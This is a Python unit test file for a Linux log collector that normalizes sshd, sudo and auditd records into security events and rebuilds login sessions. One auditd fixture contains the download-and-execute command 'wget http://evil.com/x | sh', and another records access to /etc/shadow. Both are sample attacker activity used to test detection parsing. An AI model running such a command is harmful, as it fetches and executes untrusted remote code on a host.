"""Linux 日志模块（collectors/linux）单元测试。

会话重建（Session / rebuild_sessions）仅作为测试辅助：用于验证
login/logout 事件携带了足够的会话关联信息（user/src_ip/session_id），
供下游 correlation 模块重建会话时间线。它不属于模块的跨模块输出。
"""
from pathlib import Path
import json
from dataclasses import dataclass, field
from typing import List, Optional

from jsonschema import Draft202012Validator, FormatChecker

from collectors.linux.adapter import normalize_linux_records
from common.models import NormalizedEvent

ROOT = Path(__file__).resolve().parents[1]

AUTH_LOG_LINES = [
    "Sep  8 10:00:00 webserver01 sshd[1234]: Accepted password for root from 10.10.0.10 port 52000 ssh2",
    "Sep  8 10:01:02 webserver01 sshd[1234]: Failed password for invalid user admin from 10.10.0.10 port 52001 ssh2",
    "Sep  8 10:05:00 webserver01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=student ; COMMAND=/usr/bin/whoami",
    "Sep  8 10:06:00 webserver01 su: (to root) student on pts/1",
    "Sep  8 10:07:00 webserver01 sshd[1234]: session opened for user root by (uid=0)",
    "Sep  8 10:20:00 webserver01 sshd[1234]: session closed for user root",
]

_LOGIN_ACTIONS = {"login_success", "session_open"}
_LOGOUT_ACTIONS = {"logout", "session_close", "disconnect"}


@dataclass
class Session:
    """测试辅助用的会话结构（非公共契约对象）。"""

    host_id: Optional[str]
    user: Optional[str]
    src_ip: Optional[str]
    start_time: str
    end_time: Optional[str]
    event_ids: List[str] = field(default_factory=list)
    session_id: Optional[str] = None


def rebuild_sessions(events):
    """测试辅助：按 user 做 login/logout 启发式配对，验证会话信息可重建。"""
    ordered = sorted(events, key=lambda e: e.timestamp)
    sessions: List[Session] = []
    open_map: dict = {}

    for ev in ordered:
        if not ev.user:
            continue
        if ev.action in _LOGIN_ACTIONS:
            open_map.setdefault(ev.user, []).append(ev)
        elif ev.action in _LOGOUT_ACTIONS:
            pending = open_map.get(ev.user)
            if pending:
                start = pending.pop(0)
                sessions.append(
                    Session(
                        host_id=start.host_id or ev.host_id,
                        user=ev.user,
                        src_ip=start.src_ip or ev.src_ip,
                        start_time=start.timestamp,
                        end_time=ev.timestamp,
                        event_ids=[start.event_id, ev.event_id],
                        session_id=ev.metadata.get("session_id")
                        or start.metadata.get("session_id"),
                    )
                )

    for user, pending in open_map.items():
        for start in pending:
            sessions.append(
                Session(
                    host_id=start.host_id,
                    user=user,
                    src_ip=start.src_ip,
                    start_time=start.timestamp,
                    end_time=None,
                    event_ids=[start.event_id],
                    session_id=start.metadata.get("session_id"),
                )
            )

    return sessions


def _normalize(lines, **kwargs):
    return normalize_linux_records([{"raw": ln} for ln in lines], "task_demo_001", **kwargs)


def _load_schema():
    return json.loads((ROOT / "schemas" / "normalized_event.schema.json").read_text(encoding="utf-8"))


def test_events_pass_pydantic_and_json_schema():
    events = _normalize(AUTH_LOG_LINES)
    assert len(events) == len(AUTH_LOG_LINES)

    validator = Draft202012Validator(_load_schema(), format_checker=FormatChecker())
    for ev in events:
        NormalizedEvent.model_validate(ev)  # 公共 Pydantic 模型
        data = ev.model_dump(mode="json")
        assert not list(validator.iter_errors(data)), f"{ev.event_id} 未通过 JSON Schema"


def test_login_success_fields():
    ev = _normalize(AUTH_LOG_LINES)[0]
    assert ev.event_id.startswith("evt_")
    assert ev.task_id == "task_demo_001"
    assert ev.source_type == "host_log"
    assert ev.source == "auth.log"
    assert ev.host_id == "webserver01"
    assert ev.action == "login_success"
    assert ev.user == "root"
    assert ev.src_ip == "10.10.0.10"
    assert ev.src_port == 52000
    assert ev.process.name == "sshd"
    assert ev.process.pid == 1234


def test_timestamp_normalization():
    ev = _normalize(AUTH_LOG_LINES)[0]
    # 补了年份 + 补了时区（默认 +08:00）
    assert ev.timestamp.startswith("2026-09-08T10:00:00")
    assert ev.timestamp.endswith("+08:00")


def test_login_failure():
    ev = _normalize(AUTH_LOG_LINES)[1]
    assert ev.action == "login_failure"
    assert ev.user == "admin"
    assert ev.src_ip == "10.10.0.10"
    assert ev.src_port == 52001


def test_sudo_exec():
    ev = _normalize(AUTH_LOG_LINES)[2]
    assert ev.action == "sudo_exec"
    assert ev.user == "root"
    assert ev.object.type == "command"
    assert ev.object.name == "/usr/bin/whoami"
    assert ev.metadata.get("target_user") == "student"


def test_user_switch():
    ev = _normalize(AUTH_LOG_LINES)[3]
    assert ev.action == "user_switch"
    assert ev.user == "student"
    assert ev.metadata.get("target_user") == "root"


def test_unknown_hostname_maps_to_null():
    lines = ["Sep  8 10:00:00 unknownhost sshd[1]: Accepted password for root from 1.2.3.4 port 22 ssh2"]
    ev = _normalize(lines)[0]
    assert ev.host_id is None
    assert ev.metadata.get("raw_hostname") == "unknownhost"


def test_clock_offset_applied():
    lines = ["Sep  8 10:00:00 webserver01 sshd[1]: Accepted password for root from 1.2.3.4 port 22 ssh2"]
    ev = normalize_linux_records(
        [{"raw": lines[0]}], "task_demo_001", clock_offset={"webserver01": 3600}
    )[0]
    assert ev.timestamp.startswith("2026-09-08T11:00:00")


def test_iso_header_line_supported():
    lines = ["2026-09-08T10:00:00+08:00 coreserver01 sshd[9]: Failed password for root from 10.10.0.10 port 22 ssh2"]
    ev = _normalize(lines)[0]
    assert ev.host_id == "coreserver01"
    assert ev.action == "login_failure"
    assert ev.timestamp == "2026-09-08T10:00:00+08:00"


def test_rebuild_sessions_pairs_login_and_logout():
    events = _normalize(AUTH_LOG_LINES)
    sessions = rebuild_sessions(events)
    # 至少配对出一段 root 会话（login_success -> session_closed）
    closed = [s for s in sessions if s.user == "root" and s.end_time]
    assert closed
    assert closed[0].src_ip == "10.10.0.10"
    assert len(closed[0].event_ids) == 2


def test_rebuild_sessions_keeps_open_session():
    lines = [
        "Sep  8 10:00:00 webserver01 sshd[1]: Accepted password for root from 10.10.0.10 port 22 ssh2",
    ]
    sessions = rebuild_sessions(_normalize(lines))
    open_sessions = [s for s in sessions if s.end_time is None]
    assert open_sessions
    assert open_sessions[0].user == "root"


AUDITD_LINES = [
    "type=USER_AUTH msg=audit(1609459200.500:457): pid=2001 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:authentication grantors=pam_unix acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=10.10.0.10 addr=10.10.0.10 terminal=ssh res=success'",
    "type=USER_LOGIN msg=audit(1609459200.500:458): pid=2001 uid=0 auid=1000 ses=1 subj=unconfined msg='op=login id=1000 exe=\"/usr/sbin/sshd\" hostname=? addr=10.10.0.10 terminal=/dev/pts/0 res=success'",
    "type=SYSCALL msg=audit(1609459201.123:459): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=1000 pid=2000 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm=\"whoami\" exe=\"/usr/bin/whoami\" key=(null)",
    "type=PATH msg=audit(1609459201.123:459): item=0 name=\"/etc/shadow\" inode=123456 dev=fd:00 mode=0100600 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL",
    "type=USER_END msg=audit(1609459300.600:460): pid=2001 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_unix,pam_env acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=? addr=10.10.0.10 terminal=/dev/pts/0 res=success'",
]


def _normalize_auditd(lines, **kwargs):
    return normalize_linux_records(
        [{"raw": ln, "host": "webserver01"} for ln in lines], "task_demo_001", **kwargs
    )


def test_auditd_events_pass_schema():
    events = _normalize_auditd(AUDITD_LINES)
    assert len(events) == len(AUDITD_LINES)

    validator = Draft202012Validator(_load_schema(), format_checker=FormatChecker())
    for ev in events:
        NormalizedEvent.model_validate(ev)
        assert not list(validator.iter_errors(ev.model_dump(mode="json")))


def test_auditd_user_auth():
    ev = _normalize_auditd(AUDITD_LINES)[0]
    assert ev.source == "auditd"
    assert ev.action == "login_success"  # USER_AUTH res=success 即成功登录
    assert ev.user == "root"
    assert ev.src_ip == "10.10.0.10"
    assert ev.host_id == "webserver01"
    assert ev.metadata.get("audit_type") == "USER_AUTH"


def test_auditd_user_login():
    ev = _normalize_auditd(AUDITD_LINES)[1]
    assert ev.action == "session_open"  # op=login 只带数值 uid
    assert ev.user == "1000"
    assert ev.src_ip == "10.10.0.10"


def test_auditd_process_exec():
    ev = _normalize_auditd(AUDITD_LINES)[2]
    assert ev.action == "process_exec"
    assert ev.user == "1000"  # auid 数值 UID
    assert ev.object.type == "process"
    assert ev.object.name == "/usr/bin/whoami"
    assert ev.process.name == "whoami"
    assert ev.process.pid == 2000
    assert ev.metadata.get("audit_type") == "SYSCALL"


def test_auditd_file_access():
    ev = _normalize_auditd(AUDITD_LINES)[3]
    assert ev.action == "file_access"
    assert ev.object.type == "file"
    assert ev.object.name == "/etc/shadow"


def test_auditd_timestamp_from_epoch():
    ev = _normalize_auditd(AUDITD_LINES)[0]
    # 1609459200 = 2021-01-01T00:00:00Z -> +08:00 = 08:00:00
    assert ev.timestamp.startswith("2021-01-01T08:00:00")


def test_auditd_default_host():
    lines = [
        "type=SYSCALL msg=audit(1609459201.123:459): arch=c000003e syscall=59 success=yes exit=0 ppid=1000 pid=2000 auid=1000 uid=0 comm=\"whoami\" exe=\"/usr/bin/whoami\"",
    ]
    events = normalize_linux_records(
        [{"raw": lines[0]}], "task_demo_001", default_host="coreserver01"
    )
    assert events[0].host_id == "coreserver01"


def test_auditd_session_rebuild():
    # USER_AUTH(login_success, root) -> USER_END(logout, root) 按 user 配对
    sessions = rebuild_sessions(_normalize_auditd(AUDITD_LINES))
    closed = [s for s in sessions if s.user == "root" and s.end_time]
    assert closed
    assert closed[0].src_ip == "10.10.0.10"


# ---------------------------------------------------------------- RFC5424 / RFC3164 前缀

def test_rfc5424_pri_prefix():
    lines = [
        "<134>1 2026-09-08T10:00:00+08:00 webserver01 sshd 1234 - - Failed password for root from 10.10.0.10 port 22 ssh2",
    ]
    ev = _normalize(lines)[0]
    assert ev.host_id == "webserver01"
    assert ev.action == "login_failure"
    assert ev.user == "root"
    assert ev.src_ip == "10.10.0.10"
    assert ev.process.name == "sshd"
    assert ev.process.pid == 1234


def test_rfc3164_pri_prefix():
    lines = [
        "<34>Sep  8 10:00:00 webserver01 sshd[1234]: Accepted password for root from 10.10.0.10 port 22 ssh2",
    ]
    ev = _normalize(lines)[0]
    assert ev.host_id == "webserver01"
    assert ev.action == "login_success"
    assert ev.user == "root"


def test_iso_naive_tz():
    lines = ["2026-09-08T10:00:00 coreserver01 sshd[9]: Failed password for root from 10.10.0.10 port 22 ssh2"]
    ev = _normalize(lines)[0]
    assert ev.host_id == "coreserver01"
    assert ev.action == "login_failure"
    assert ev.timestamp.endswith("+08:00")


# ---------------------------------------------------------------- auth.log 事件变体

def test_sshd_failed_publickey():
    lines = [
        "Sep  8 10:00:00 webserver01 sshd[1234]: Failed publickey for root from 10.10.0.10 port 52000 ssh2: RSA SHA256:abc",
    ]
    ev = _normalize(lines)[0]
    assert ev.action == "login_failure"
    assert ev.user == "root"
    assert ev.src_ip == "10.10.0.10"
    assert ev.src_port == 52000


def test_sshd_disconnected_from_user():
    lines = [
        "Sep  8 10:20:00 webserver01 sshd[1234]: Disconnected from user root 10.10.0.10 port 52000",
    ]
    ev = _normalize(lines)[0]
    assert ev.action == "logout"
    assert ev.user == "root"
    assert ev.src_ip == "10.10.0.10"
    assert ev.src_port == 52000


def test_sudo_command_with_args():
    lines = [
        'Sep  8 10:05:00 webserver01 sudo: root : TTY=pts/0 ; PWD=/root ; USER=student ; COMMAND=/bin/sh -c "echo hi"',
    ]
    ev = _normalize(lines)[0]
    assert ev.action == "sudo_exec"
    assert ev.object.type == "command"
    assert ev.object.name == '/bin/sh -c "echo hi"'
    assert ev.metadata.get("target_user") == "student"


def test_authlog_fallback():
    lines = ["Sep  8 10:00:00 webserver01 cron[1]: (root) CMD (ls /tmp)"]
    ev = _normalize(lines)[0]
    assert ev.action == "auth_log"
    assert ev.user is None
    assert ev.process.name == "cron"


# ---------------------------------------------------------------- auditd 补充事件类型

def test_auditd_user_auth_failure():
    lines = [
        "type=USER_AUTH msg=audit(1609459200.500:457): pid=2001 uid=0 auid=1000 ses=1 msg='op=PAM:authentication acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=? addr=10.10.0.10 terminal=ssh res=failed'",
    ]
    ev = _normalize_auditd(lines)[0]
    assert ev.action == "login_failure"
    assert ev.user == "root"
    assert ev.src_ip == "10.10.0.10"


def test_auditd_user_logout():
    lines = [
        "type=USER_LOGOUT msg=audit(1609459300.600:460): pid=2001 uid=0 auid=1000 ses=1 msg='op=logout acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=? addr=10.10.0.10 terminal=/dev/pts/0 res=success'",
    ]
    ev = _normalize_auditd(lines)[0]
    assert ev.action == "logout"
    assert ev.user == "root"
    assert ev.src_ip == "10.10.0.10"


def test_auditd_execve_argv():
    lines = [
        'type=EXECVE msg=audit(1609459201.200:500): argc=3 a0="bash" a1="-c" a2="wget http://evil.com/x | sh"',
    ]
    ev = _normalize_auditd(lines)[0]
    assert ev.action == "command_args"
    assert ev.object.type == "command"
    assert ev.object.name == "bash -c wget http://evil.com/x | sh"


def test_auditd_non_exec_syscall():
    lines = [
        'type=SYSCALL msg=audit(1609459201.123:459): arch=c000003e syscall=257 success=yes exit=3 ppid=1000 pid=2000 auid=1000 uid=0 comm="cat" exe="/usr/bin/cat"',
    ]
    ev = _normalize_auditd(lines)[0]
    assert ev.action == "syscall"
    assert ev.object.type == "process"
    assert ev.object.name == "/usr/bin/cat"


def test_auditd_config_change():
    lines = [
        'type=CONFIG_CHANGE msg=audit(1609459201.123:459): auid=1000 ses=1 op=add_rule key="test"',
    ]
    ev = _normalize_auditd(lines)[0]
    assert ev.action == "config_change"
    assert "config" in ev.labels


def test_auditd_unknown_type():
    lines = ['type=CWD msg=audit(1609459201.123:459): cwd="/root"']
    ev = _normalize_auditd(lines)[0]
    assert ev.action == "audit_event"
    assert ev.metadata.get("audit_type") == "CWD"


def test_auditd_addr_sentinel():
    lines = [
        "type=USER_AUTH msg=audit(1609459200.500:457): pid=2001 uid=0 auid=1000 ses=1 msg='op=PAM:authentication acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=? addr=? terminal=tty1 res=success'",
    ]
    ev = _normalize_auditd(lines)[0]
    assert ev.action == "login_success"
    assert ev.user == "root"
    assert ev.src_ip is None  # addr=? 归一为 None


def test_auditd_ppid_path():
    lines = [
        'type=SYSCALL msg=audit(1609459201.123:459): arch=c000003e syscall=59 success=yes exit=0 ppid=1000 pid=2000 auid=1000 uid=0 comm="whoami" exe="/usr/bin/whoami"',
    ]
    ev = _normalize_auditd(lines)[0]
    assert ev.process.ppid == 1000
    assert ev.process.path == "/usr/bin/whoami"
    assert ev.process.pid == 2000
    assert ev.process.name == "whoami"


def test_auditd_node_prefix():
    lines = [
        'node=webserver01 type=SYSCALL msg=audit(1609459201.123:459): arch=c000003e syscall=59 success=yes exit=0 ppid=1000 pid=2000 auid=1000 uid=0 comm="whoami" exe="/usr/bin/whoami"',
    ]
    ev = _normalize(lines)[0]
    assert ev.action == "process_exec"
    assert ev.host_id == "webserver01"


# ---------------------------------------------------------------- 入口参数 / 输入形式

def test_year_override():
    lines = ["Sep  8 10:00:00 webserver01 sshd[1]: Accepted password for root from 1.2.3.4 port 22 ssh2"]
    ev = _normalize(lines, year=2020)[0]
    assert ev.timestamp.startswith("2020-09-08T10:00:00")


def test_tz_offset_override():
    lines = ["Sep  8 10:00:00 webserver01 sshd[1]: Accepted password for root from 1.2.3.4 port 22 ssh2"]
    ev = _normalize(lines, tz_offset_hours=0)[0]
    assert ev.timestamp.endswith("+00:00")


def test_auditd_clock_offset():
    events = _normalize_auditd(AUDITD_LINES, clock_offset={"webserver01": 3600})
    ev = events[0]  # epoch 1609459200.500 -> 08:00:00.500+08:00 -> +1h
    assert ev.timestamp.startswith("2021-01-01T09:00:00")


def test_string_records():
    events = normalize_linux_records(
        ["Sep  8 10:00:00 webserver01 sshd[1]: Accepted password for root from 1.2.3.4 port 22 ssh2"],
        "task_demo_001",
    )
    assert len(events) == 1
    assert events[0].action == "login_success"


def test_auditd_hostname_key():
    lines = [
        'type=SYSCALL msg=audit(1609459201.123:459): arch=c000003e syscall=59 success=yes exit=0 ppid=1000 pid=2000 auid=1000 uid=0 comm="whoami" exe="/usr/bin/whoami"',
    ]
    events = normalize_linux_records(
        [{"raw": lines[0], "hostname": "webserver01"}], "task_demo_001"
    )
    assert events[0].host_id == "webserver01"


def test_malformed_skipped():
    events = normalize_linux_records(
        [{"raw": ""}, {"raw": "   "}, {"raw": "type=BROKEN not-an-audit-line"}, {"raw": "garbage line"}],
        "task_demo_001",
    )
    assert events == []
